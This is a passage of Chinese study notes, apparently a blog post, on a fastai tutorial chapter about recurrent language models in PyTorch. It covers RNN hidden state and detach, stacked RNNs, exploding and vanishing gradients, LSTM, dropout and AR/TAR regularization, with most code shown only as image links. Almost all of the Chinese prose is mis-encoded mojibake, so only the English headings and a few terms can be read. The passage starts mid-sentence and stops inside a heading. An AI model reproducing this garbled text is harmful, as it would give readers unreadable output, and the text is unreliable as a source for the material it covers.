ä¸€ä¸ªåºåˆ—ä½ç½®ï¼›å®ƒå¿…é¡»å­¦ä¼šå¤„ç†æ‰€æœ‰çš„ä½ç½®ï¼Œå› ä¸ºå±‚çš„æƒé‡ä¸ä¼šæ”¹å˜ï¼Œä½ å¯èƒ½ä¼šè®¤ä¸ºè¿ç»­çš„å±‚æ˜¯â€œåŒä¸€å±‚â€çš„é‡å¤ã€‚äº‹å®ä¸Šï¼ŒPyTorchä½¿è¿™ä¸€ç‚¹å…·ä½“åŒ–ï¼›æˆ‘ä»¬å¯ä»¥åªåˆ›å»ºä¸€ä¸ªå±‚ï¼Œç„¶åå¤šæ¬¡ä½¿ç”¨å®ƒã€‚</p><h2 id="Our-Language-Model-in-PyTorch"><a href="#Our-Language-Model-in-PyTorch" class="headerlink" title="Our Language Model in PyTorch"></a>Our Language Model in PyTorch</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/336.png"></p><h3 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/337.png"><br>ç›¸åŒé¢œè‰²ä»£è¡¨æ˜¯åŒä¸€ä¸ªæƒé‡çŸ©é˜µï¼ˆè¿™é‡ŒæŠŠEmbeddingæ¢æˆlinearå°±ä¸è¡Œäº†ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼‰</p><h3 id="ä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªEmbeddingçŸ©é˜µï¼Œæ˜æ˜æœ‰å¾ˆå¤šè¯ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªEmbeddingçŸ©é˜µï¼Œæ˜æ˜æœ‰å¾ˆå¤šè¯ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªEmbeddingçŸ©é˜µï¼Œæ˜æ˜æœ‰å¾ˆå¤šè¯ï¼Ÿ"></a>ä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªEmbeddingçŸ©é˜µï¼Œæ˜æ˜æœ‰å¾ˆå¤šè¯ï¼Ÿ</h3><p>å› ä¸ºæ¦‚å¿µä¸Šæ¥è®²å®ƒä»¬éƒ½ä»£è¡¨è‹±è¯­çš„å†…å®¹è¯ï¼ˆä¸å¤ªæ‡‚ï¼‰<br>æˆ‘ç†è§£çš„æ˜¯è¿™ä¸ªEmbeddingäº‹å®ä¸ŠåŒ…å«äº†æ‰€æœ‰è¯çš„æ„ä¹‰äº†å·²ç»ï¼Œæ¯•ç«Ÿ<img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/338.png"></p><h2 id="è®­ç»ƒ-2"><a href="#è®­ç»ƒ-2" class="headerlink" title="è®­ç»ƒ"></a>è®­ç»ƒ</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/339.png"></p><h3 id="baselineå‡†ç¡®ç‡"><a href="#baselineå‡†ç¡®ç‡" class="headerlink" title="baselineå‡†ç¡®ç‡"></a>baselineå‡†ç¡®ç‡</h3><p>thousandå‡ºç°çš„æ¦‚ç‡æœ€å¤§ï¼Œå‡è®¾æ¯æ¬¡éƒ½é¢„æµ‹æ˜¯thousandï¼Œé‚£å‡†ç¡®ç‡å°±æ˜¯15%<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/340.png"></p><h2 id="Our-First-Recurrent-Neural-Network"><a href="#Our-First-Recurrent-Neural-Network" class="headerlink" title="Our First Recurrent Neural Network"></a>Our First Recurrent Neural Network</h2><p>çœ‹çœ‹æˆ‘ä»¬æ¨¡å—çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç”¨forå¾ªç¯æ›¿æ¢è°ƒç”¨å±‚çš„é‡å¤ä»£ç æ¥ç®€åŒ–å®ƒã€‚é™¤äº†ä½¿æˆ‘ä»¬çš„ä»£ç æ›´ç®€å•ä¹‹å¤–ï¼Œè¿™è¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå³æˆ‘ä»¬èƒ½å¤Ÿå°†æˆ‘ä»¬çš„æ¨¡å—åŒæ ·å¥½åœ°åº”ç”¨äºä¸åŒé•¿åº¦çš„ä»¤ç‰Œåºåˆ—ï¼Œè€Œä¸å±€é™äºé•¿åº¦ä¸º3çš„ä»¤ç‰Œåˆ—è¡¨ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/341.png"><br>håˆå§‹åŒ–ä¸º0æ˜¯å› ä¸º0å’Œå¼ é‡ç›¸åŠ æ—¶0ä¼šå¹¿æ’­åˆ°å¼ é‡çš„å¤§å°å†ç›¸åŠ ï¼Œè¿™æ˜¯ä¸ªå¾ˆå°å·§çš„åŠŸèƒ½<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/342.png"><br>æ¢å¼ å›¾è¯´æ˜RNNï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/343.png"></p><h2 id="Improving-the-RNN"><a href="#Improving-the-RNN" class="headerlink" title="Improving the RNN"></a>Improving the RNN</h2><h3 id="Maintaining-the-state-of-an-RNN"><a href="#Maintaining-the-state-of-an-RNN" class="headerlink" title="Maintaining the state of an RNN"></a>Maintaining the state of an RNN</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/344.png"><br>ä»å¼€å¤´è®¡ç®—æ‰€æœ‰çš„æ¢¯åº¦ä¼šéå¸¸æ…¢ï¼š<br>æ‰€ä»¥é€šè¿‡detachï¼ˆï¼‰æ–¹æ³•å°†è®¡ç®—å¥½çš„æ¢¯åº¦å†å²å€¼ä¸¢æ‰<br>ä¹Ÿå°±æ˜¯è¯´æ¿€æ´»å€¼ä¾æ—§ä¿ç•™ï¼Œä½†æ˜¯æ¢¯åº¦å†å²å€¼æ²¡æœ‰ä¿ç•™<br>ä»”ç»†æƒ³æƒ³ï¼Œä¸ç®¡æˆ‘ä»¬é€‰æ‹©çš„åºåˆ—é•¿åº¦æ˜¯å¤šå°‘ï¼Œè¿™ä¸ªæ¨¡å‹éƒ½ä¼šæœ‰ç›¸åŒçš„æ¿€æ´»ï¼Œå› ä¸ºéšè—çŠ¶æ€ä¼šè®°ä½ä¸Šä¸€æ‰¹ä¸­çš„æœ€åä¸€ä¸ªæ¿€æ´»ã€‚å”¯ä¸€ä¸åŒçš„æ˜¯åœ¨æ¯ä¸€æ­¥è®¡ç®—çš„æ¢¯åº¦ï¼šå®ƒä»¬å°†åªåœ¨è¿‡å»çš„åºåˆ—é•¿åº¦æ ‡è®°ä¸Šè®¡ç®—ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæµã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸ªåºåˆ—é•¿åº¦ç»å¸¸è¢«ç§°ä¸ºbpttï¼Œä»¥ä¾¿é€šè¿‡æ—¶é—´è¿›è¡Œåå‘ä¼ æ’­ã€‚<br>æœ‰æ—¶å€™éœ€è¦æŠŠhå€¼ç½®ä¸º0ï¼Œæ‰€ä»¥åŠ äº†resetå‡½æ•°<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/345.png"><br>æ³¨æ„ï¼šåºå·1ä»£è¡¨åˆ†éš”ç¬¦â€˜.â€™<br>æ¥ä¸‹æ¥åˆ’åˆ†batch<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/346.png"><br>åˆ›å»ºè®­ç»ƒé›†éªŒè¯é›†<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/347.png"><br>åœ¨æ¯ä¸ªè½®æ¬¡å¼€å§‹çš„æ—¶å€™è¦è°ƒç”¨resetï¼ˆï¼‰æŠŠrç½®ä¸º0<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/348.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/349.png"><br>ä¼ å…¥ModelResteråˆ°callbacksåˆ—è¡¨ä¸­ï¼ˆä¹Ÿå°±æ˜¯cbsä¸­<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/350.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/351.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/352.png"></p><h2 id="åˆ›é€ æ›´å¤šæœ‰æ•ˆä¿¡æ¯"><a href="#åˆ›é€ æ›´å¤šæœ‰æ•ˆä¿¡æ¯" class="headerlink" title="åˆ›é€ æ›´å¤šæœ‰æ•ˆä¿¡æ¯"></a>åˆ›é€ æ›´å¤šæœ‰æ•ˆä¿¡æ¯</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/353.png"><br>ä¹Ÿå°±æ˜¯åœ¨åˆ›å»ºå®Œæ¯ä¸ªéšè—çŠ¶æ€åæˆ‘ä»¬å°±ç«‹å³è¿›è¡Œäº†é¢„æµ‹<br>åœ¨æ¯æ¬¡è¾“å…¥ä¸‰ä¸ªè¯ä¹‹åå› å˜é‡ä¹Ÿå˜æˆä¸‰ä¸ªè¯<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/354.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/355.png"><br>ç°åœ¨æˆ‘ä»¬éœ€è¦ä¿®æ”¹æˆ‘ä»¬çš„æ¨¡å‹ï¼Œä»¥ä¾¿å®ƒåœ¨æ¯ä¸ªå•è¯ä¹‹åè¾“å‡ºé¢„æµ‹ï¼Œè€Œä¸æ˜¯ä»…ä»…åœ¨ä¸‰ä¸ªå•è¯åºåˆ—çš„æœ«å°¾ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/356.png"><br>æ­¤æ¨¡å‹å°†è¿”å›å½¢çŠ¶bs x sl x vocab_szçš„è¾“å‡ºï¼ˆå› ä¸ºæˆ‘ä»¬åœ¨dim=1ä¸Šå åŠ ï¼‰ã€‚æˆ‘ä»¬çš„ç›®æ ‡å½¢çŠ¶æ˜¯bs x slï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆå°†å…¶å±•å¹³ï¼Œç„¶åå†å°†å…¶ç”¨äºF.crossï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/357.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/358.png"><br>æˆ‘ä»¬éœ€è¦è®­ç»ƒæ›´é•¿çš„æ—¶é—´ï¼Œå› ä¸ºä»»åŠ¡å·²ç»æ”¹å˜äº†ä¸€ç‚¹ï¼Œç°åœ¨æ›´å¤æ‚äº†ã€‚ä½†æˆ‘ä»¬æœ€ç»ˆå¾—åˆ°äº†ä¸€ä¸ªå¥½ç»“æœã€‚ã€‚ã€‚è‡³å°‘ï¼Œæœ‰æ—¶å€™ã€‚å¦‚æœè¿è¡Œå‡ æ¬¡ï¼Œå°±ä¼šå‘ç°åœ¨ä¸åŒçš„è¿è¡Œä¸­å¯ä»¥å¾—åˆ°å®Œå…¨ä¸åŒçš„ç»“æœã€‚è¿™æ˜¯å› ä¸ºå®é™…ä¸Šæˆ‘ä»¬è¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸æ·±çš„ç½‘ç»œï¼Œå¯ä»¥äº§ç”Ÿéå¸¸å¤§æˆ–éå¸¸å°çš„æ¢¯åº¦ã€‚æˆ‘ä»¬å°†åœ¨æœ¬ç« çš„ä¸‹ä¸€éƒ¨åˆ†çœ‹åˆ°å¦‚ä½•å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚ç°åœ¨ï¼Œå¾—åˆ°ä¸€ä¸ªæ›´å¥½çš„æ¨¡å‹çš„æ˜æ˜¾æ–¹æ³•æ˜¯æ›´æ·±å…¥ï¼šåœ¨æˆ‘ä»¬çš„åŸºæœ¬RNNä¸­ï¼Œéšè—çŠ¶æ€å’Œè¾“å‡ºæ¿€æ´»ä¹‹é—´åªæœ‰ä¸€ä¸ªçº¿æ€§å±‚ï¼Œæ‰€ä»¥ä¹Ÿè®¸æˆ‘ä»¬å¯ä»¥ç”¨æ›´å¤šçš„æ–¹æ³•å¾—åˆ°æ›´å¥½çš„ç»“æœã€‚</p><h2 id="åŠ æ·±å±‚æ•°"><a href="#åŠ æ·±å±‚æ•°" class="headerlink" title="åŠ æ·±å±‚æ•°"></a>åŠ æ·±å±‚æ•°</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/359.png"><br>æ³¨æ„ï¼šè™šçº¿å’Œå®çº¿çš„æƒé‡æ˜¯ä¸åŒçš„<br>è¿™ä¸ªè¢«ç§°ä½œæ˜¯å †å RNNæˆ–è€…å¤šå±‚RNN<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/360.png"><br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨PyTorchçš„RNNç±»æ¥èŠ‚çœä¸€äº›æ—¶é—´ï¼Œè¯¥ç±»å®ç°äº†æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„å†…å®¹ï¼Œä½†ä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†å †å å¤šä¸ªRNNçš„é€‰é¡¹ï¼Œæ­£å¦‚æˆ‘ä»¬æ‰€è®¨è®ºçš„ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/361.png"><br>å…¶ä¸­n_layersè®¾ç½®äº†è¦å †å å¤šå°‘ä¸ªå¾ªç¯å±‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/362.png"><br>ç°åœ¨çœŸä»¤äººå¤±æœ›ã€‚ã€‚ã€‚æˆ‘ä»¬ä»¥å‰çš„å•å±‚RNNæ€§èƒ½æ›´å¥½ã€‚ä¸ºä»€ä¹ˆï¼ŸåŸå› æ˜¯æˆ‘ä»¬æœ‰ä¸€ä¸ªæ›´æ·±å±‚æ¬¡çš„æ¨¡å‹ï¼Œå¯¼è‡´çˆ†ç‚¸æˆ–æ¶ˆå¤±æ¿€æ´»ã€‚<br>åœ¨å®è·µä¸­ï¼Œä»è¿™ç§RNNåˆ›å»ºç²¾ç¡®çš„æ¨¡å‹æ˜¯å›°éš¾çš„ã€‚å¦‚æœæˆ‘ä»¬å°‘è°ƒç”¨detachï¼Œå¹¶ä¸”æœ‰æ›´å¤šçš„å±‚ï¼Œæˆ‘ä»¬å°†è·å¾—æ›´å¥½çš„ç»“æœè¿™å°†ä½¿æˆ‘ä»¬çš„RNNæœ‰æ›´é•¿çš„æ—¶é—´èŒƒå›´å¯ä»¥å­¦ä¹ ï¼Œå¹¶ä¸”å¯ä»¥åˆ›å»ºæ›´ä¸°å¯Œçš„ç‰¹æ€§ã€‚ä½†è¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬è¿˜æœ‰æ›´æ·±å±‚çš„æ¨¡å¼éœ€è¦è®­ç»ƒã€‚æ·±åº¦å­¦ä¹ å‘å±•çš„å…³é”®æŒ‘æˆ˜åœ¨äºå¦‚ä½•è®­ç»ƒè¿™äº›æ¨¡å‹ã€‚è¿™ä¹‹æ‰€ä»¥å…·æœ‰æŒ‘æˆ˜æ€§ï¼Œæ˜¯å› ä¸ºå½“ä½ å°†ä¸€ä¸ªçŸ©é˜µä¹˜ä»¥å¾ˆå¤šæ¬¡æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚æƒ³æƒ³å½“ä½ æŠŠä¸€ä¸ªæ•°ä¹˜ä»¥å¾ˆå¤šæ¬¡æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ ä¹˜ä»¥2ï¼Œä»1å¼€å§‹ï¼Œä½ å¾—åˆ°åºåˆ—1ï¼Œ2ï¼Œ4ï¼Œ8ï¼Œã€‚ã€‚ã€‚ç»è¿‡32æ­¥ï¼Œä½ å·²ç»æ˜¯4294967296äº†ã€‚å¦‚æœä½ ä¹˜ä»¥0.5ï¼Œä½ ä¼šå¾—åˆ°0.5ï¼Œ0.25ï¼Œ0.125â€¦ç»è¿‡32æ­¥ï¼Œä½ ä¼šå¾—åˆ°0.00000000023ã€‚æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œä¹˜ä»¥ä¸€ä¸ªæ¯”1ç¨é«˜æˆ–ç¨ä½çš„æ•°ï¼Œåœ¨é‡å¤å‡ æ¬¡ä¹˜æ³•ä¹‹åï¼Œæˆ‘ä»¬çš„èµ·å§‹æ•°å°±ä¼šçˆ†ç‚¸æˆ–æ¶ˆå¤±ã€‚å› ä¸ºçŸ©é˜µä¹˜æ³•åªæ˜¯å°†æ•°å­—ç›¸ä¹˜å¹¶ç›¸åŠ ï¼Œé‡å¤çš„çŸ©é˜µä¹˜æ³•ä¹Ÿä¼šå‘ç”ŸåŒæ ·çš„æƒ…å†µã€‚è¿™å°±æ˜¯æ·±å±‚ç¥ç»ç½‘ç»œçš„å…¨éƒ¨â€”â€”æ¯ä¸€å±‚éƒ½æ˜¯å¦ä¸€ä¸ªçŸ©é˜µä¹˜æ³•ã€‚è¿™æ„å‘³ç€ä¸€ä¸ªæ·±åº¦ç¥ç»ç½‘ç»œå¾ˆå®¹æ˜“ä»¥éå¸¸å¤§æˆ–éå¸¸å°çš„æ•°å­—ç»“æŸã€‚è¿™æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºè®¡ç®—æœºå­˜å‚¨æ•°å­—ï¼ˆç§°ä¸ºâ€œæµ®ç‚¹â€ï¼‰çš„æ–¹å¼æ„å‘³ç€æ•°å­—ç¦»é›¶è¶Šè¿œï¼Œå®ƒä»¬çš„å‡†ç¡®åº¦å°±è¶Šä½ã€‚&lt;&gt;ä¸­çš„å›¾è¡¨æ¥è‡ªä¸€ç¯‡ä¼˜ç§€çš„æ–‡ç« â€œæ‚¨ä»æœªæƒ³äº†è§£æµ®ç‚¹ï¼Œä½†å°†è¢«è¿«äº†è§£çš„å†…å®¹â€ï¼Œå®ƒæ˜¾ç¤ºäº†æµ®ç‚¹æ•°çš„ç²¾åº¦æ˜¯å¦‚ä½•éšæ•°å­—è¡Œè€Œå˜åŒ–çš„ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/363.png"><br>è¿™ç§ä¸ç²¾ç¡®æ€§æ„å‘³ç€ï¼Œå¯¹äºæ·±åº¦ç½‘ç»œï¼Œé€šå¸¸ä¸ºæ›´æ–°æƒé‡è€Œè®¡ç®—çš„æ¢¯åº¦æœ€ç»ˆä¸ºé›¶æˆ–æ— ç©·å¤§ã€‚è¿™é€šå¸¸è¢«ç§°ä¸ºæ¶ˆå¤±æ¢¯åº¦æˆ–çˆ†ç‚¸æ¢¯åº¦é—®é¢˜ã€‚è¿™æ„å‘³ç€åœ¨SGDä¸­ï¼Œæƒé‡è¦ä¹ˆæ ¹æœ¬ä¸æ›´æ–°ï¼Œè¦ä¹ˆè·³åˆ°æ— ç©·å¤§ã€‚ä¸ç®¡æ€æ ·ï¼Œä»–ä»¬éƒ½ä¸ä¼šéšç€è®­ç»ƒè€Œè¿›æ­¥ã€‚ç ”ç©¶äººå‘˜å·²ç»å¼€å‘äº†è®¸å¤šæ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°†åœ¨æœ¬ä¹¦åé¢è®¨è®ºã€‚ä¸€ç§é€‰æ‹©æ˜¯æ”¹å˜å±‚çš„å®šä¹‰ï¼Œä½¿å…¶ä¸å¤ªå¯èƒ½æœ‰çˆ†ç‚¸æ€§çš„æ¿€æ´»ã€‚å½“æˆ‘ä»¬è®¨è®ºæ‰¹å¤„ç†è§„èŒƒåŒ–æ—¶ï¼Œä»¥åŠå½“æˆ‘ä»¬è®¨è®ºresnetæ—¶ï¼Œæˆ‘ä»¬å°†åœ¨&lt;ã€‚å¤„ç†è¿™ä¸ªé—®é¢˜çš„å¦ä¸€ä¸ªç­–ç•¥æ˜¯å°å¿ƒåˆå§‹åŒ–ï¼Œè¿™æ˜¯æˆ‘ä»¬å°†åœ¨&lt;&gt;ä¸­ç ”ç©¶çš„ä¸»é¢˜ã€‚å¯¹äºRNNï¼Œæœ‰ä¸¤ç§ç±»å‹çš„å±‚ç»å¸¸è¢«ç”¨æ¥é¿å…çˆ†ç‚¸æ€§æ¿€æ´»ï¼šé€‰é€šé€’å½’å•å…ƒï¼ˆGRUï¼‰å’Œé•¿-çŸ­æœŸè®°å¿†ï¼ˆLSTMï¼‰å±‚ã€‚è¿™ä¸¤ä¸ªéƒ½å¯ä»¥åœ¨PyTorchä¸­ä½¿ç”¨ï¼Œå¹¶ä¸”æ˜¯RNNå±‚çš„ç›´æ¥æ›¿ä»£å“ã€‚åœ¨è¿™æœ¬ä¹¦ä¸­æˆ‘ä»¬å°†åªè®¨è®ºLSTMï¼›ç½‘ä¸Šæœ‰å¾ˆå¤šå¾ˆå¥½çš„æ•™ç¨‹è§£é‡ŠGRUsï¼Œå®ƒæ˜¯LSTMè®¾è®¡çš„ä¸€ä¸ªå°å˜ç§ã€‚</p><h2 id="LSTM"><a href="#LSTM" class="headerlink" title="LSTM"></a>LSTM</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/364.png"><br>æ¯ä¸€å±‚é‡Œæœ‰å¾®å°çš„ç¥ç»ç½‘ç»œï¼Œç”¨äºå†³å®šä¿å­˜å¤šå°‘å†å²çŠ¶æ€ï¼Œèˆå¼ƒå¤šå°‘å†å²çŠ¶æ€ï¼Œæ·»åŠ å¤šå°‘ç§æ–°çŠ¶æ€<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/365.png"><br>å®é™…ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é‡æ„ä»£ç ã€‚å¦å¤–ï¼Œåœ¨æ€§èƒ½æ–¹é¢ï¼Œä¸€ä¸ªå¤§çš„çŸ©é˜µä¹˜æ³•è¦æ¯”å››ä¸ªå°çš„çŸ©é˜µä¹˜æ³•å¥½ï¼ˆè¿™æ˜¯å› ä¸ºæˆ‘ä»¬åªåœ¨GPUä¸Šå¯åŠ¨ä¸€æ¬¡ç‰¹æ®Šçš„fastå†…æ ¸ï¼Œå®ƒè®©GPUæœ‰æ›´å¤šçš„å¹¶è¡Œå·¥ä½œè¦åšï¼‰ã€‚å †å éœ€è¦ä¸€ç‚¹æ—¶é—´ï¼ˆå› ä¸ºæˆ‘ä»¬å¿…é¡»åœ¨GPUä¸Šç§»åŠ¨ä¸€ä¸ªå¼ é‡ï¼Œä½¿å…¶å…¨éƒ¨ä½äºä¸€ä¸ªè¿ç»­çš„æ•°ç»„ä¸­ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªå•ç‹¬çš„å±‚ä½œä¸ºè¾“å…¥å’Œéšè—çŠ¶æ€ã€‚ç»è¿‡ä¼˜åŒ–å’Œé‡æ„çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/366.png"><br>å…¶ä¸­chunkæ–¹æ³•ç”¨äºå°†æ•°æ®ç­‰åˆ†<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/367.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/368.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/369.png"><br>fastaiä¸­æŸ¥çœ‹æ¿€æ´»å€¼çš„æ–¹æ³•ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/370.png"></p><h3 id="æ­£åˆ™åŒ–-1"><a href="#æ­£åˆ™åŒ–-1" class="headerlink" title="æ­£åˆ™åŒ–"></a>æ­£åˆ™åŒ–</h3><p>dropoutå¯¹RNNéå¸¸æœ‰æ•ˆ<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/371.png"><br>å¦‚æœæ²¡æœ‰åœ¨è®­ç»ƒæˆ–è€…è¯´æ­£åœ¨éªŒè¯ï¼Œå°±æ— éœ€dropoutäº†<br>maskæ˜¯ä¸€ä¸ªä¼¯åŠªåˆ©æ¦‚ç‡<br>fastaiä¸­çš„æ¯ä¸ªmoduleéƒ½è‡ªå¸¦training</p><h4 id="æ¿€æ´»æ­£åˆ™åŒ–å’Œæ—¶é—´æ¿€æ´»æ­£åˆ™åŒ–"><a href="#æ¿€æ´»æ­£åˆ™åŒ–å’Œæ—¶é—´æ¿€æ´»æ­£åˆ™åŒ–" class="headerlink" title="æ¿€æ´»æ­£åˆ™åŒ–å’Œæ—¶é—´æ¿€æ´»æ­£åˆ™åŒ–"></a>æ¿€æ´»æ­£åˆ™åŒ–å’Œæ—¶é—´æ¿€æ´»æ­£åˆ™åŒ–</h4><ul><li>é™ä½æƒé‡</li><li>é™ä½æ¿€æ´»å€¼</li></ul><p>æ¿€æ´»æ­£åˆ™åŒ–ï¼ˆARï¼‰å’Œæ—¶é—´æ¿€æ´»æ­£åˆ™åŒ–ï¼ˆTARï¼‰æ˜¯ä¸¤ç§ä¸æƒé‡è¡°å‡éå¸¸ç›¸ä¼¼çš„æ­£åˆ™åŒ–æ–¹æ³•ï¼Œåœ¨&lt;&gt;ä¸­è®¨è®ºã€‚å½“åº”ç”¨é‡é‡è¡°å‡æ—¶ï¼Œæˆ‘ä»¬å¯¹æŸå¤±å¢åŠ ä¸€ä¸ªå°çš„æƒ©ç½šï¼Œç›®çš„æ˜¯ä½¿é‡é‡å°½å¯èƒ½å°ã€‚å¯¹äºæ¿€æ´»æ­£åˆ™åŒ–ï¼Œå®ƒæ˜¯ç”±LSTMäº§ç”Ÿçš„æœ€ç»ˆæ¿€æ´»ï¼Œæˆ‘ä»¬å°†å°è¯•ä½¿å…¶å°½å¯èƒ½å°ï¼Œè€Œä¸æ˜¯æƒé‡ã€‚ä¸ºäº†ä½¿æœ€ç»ˆæ¿€æ´»è§„åˆ™åŒ–ï¼Œæˆ‘ä»¬å¿…é¡»å°†å®ƒä»¬å­˜å‚¨åœ¨æŸä¸ªåœ°æ–¹ï¼Œç„¶åå°†å®ƒä»¬çš„å¹³æ–¹å¹³å‡å€¼æ·»åŠ åˆ°æŸå¤±ä¸­ï¼ˆä»¥åŠä¹˜æ•°alphaï¼Œè¿™ä¸é‡é‡è¡°å‡çš„wdç±»ä¼¼ï¼‰ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/372.png"><br>æ—¶é—´æ¿€æ´»æ­£åˆ™åŒ–ä¸æˆ‘ä»¬é¢„æµ‹å¥å­ä¸­çš„æ ‡è®°æœ‰å…³ã€‚è¿™æ„å‘³ç€ï¼Œå½“æˆ‘ä»¬æŒ‰é¡ºåºé˜…è¯»LSTMsçš„è¾“å‡ºæ—¶ï¼Œå®ƒä»¬å¾ˆå¯èƒ½åœ¨æŸç§ç¨‹åº¦ä¸Šæ˜¯æœ‰æ„ä¹‰çš„ã€‚TARæ˜¯ä¸ºäº†é¼“åŠ±è¿™ç§è¡Œä¸ºï¼Œåœ¨æŸå¤±ä¸­å¢åŠ ä¸€ä¸ªæƒ©ç½šï¼Œä½¿ä¸¤ä¸ªè¿ç»­çš„æ¿€æ´»ä¹‹é—´çš„å·®å¼‚å°½å¯èƒ½å°ï¼šæˆ‘ä»¬çš„æ¿€æ´»å¼ é‡æœ‰ä¸€ä¸ªå½¢çŠ¶bs x sl x n\u hidï¼Œæˆ‘ä»¬åœ¨åºåˆ—é•¿åº¦è½´ï¼ˆä¸­é—´çš„ç»´åº¦ï¼‰ä¸Šè¯»å–è¿ç»­çš„æ¿€æ´»ã€‚ç”±æ­¤ï¼ŒTARå¯ä»¥è¡¨ç¤ºä¸ºï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/373.png"><br>alphaå’Œbetaæ˜¯ä¸¤ä¸ªéœ€è¦è°ƒæ•´çš„è¶…å‚æ•°ã€‚ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦æˆ‘ä»¬çš„dropoutæ¨¡å‹è¿”å›ä¸‰ä¸ªå†…å®¹ï¼šæ­£ç¡®çš„è¾“å‡ºã€LSTM pre dropoutçš„æ¿€æ´»å’ŒLSTM post dropoutçš„æ¿€æ´»ã€‚ARé€šå¸¸åº”ç”¨äºé€€å‡ºæ¿€æ´»ï¼ˆä¸ºäº†ä¸æƒ©ç½šæˆ‘ä»¬åæ¥å˜æˆé›¶çš„æ¿€æ´»ï¼‰ï¼Œè€ŒTARåº”ç”¨äºéé€€å‡ºæ¿€æ´»ï¼ˆå› ä¸ºé‚£äº›é›¶åœ¨ä¸¤ä¸ªè¿ç»­çš„æ—¶é—´æ­¥ä¹‹é—´äº§ç”Ÿäº†å¾ˆå¤§çš„å·®å¼‚ï¼‰ã€‚ç„¶åæœ‰ä¸€ä¸ªåä¸ºRNNRegularizerçš„å›è°ƒï¼Œå®ƒå°†ä¸ºæˆ‘ä»¬åº”ç”¨è¿™ä¸ªæ­£åˆ™åŒ–ã€‚</p><h3 id="æƒé‡æ “è¿"><a href="#æƒé‡æ “è¿" class="headerlink" title="æƒé‡æ “è¿"></a>æƒé‡æ 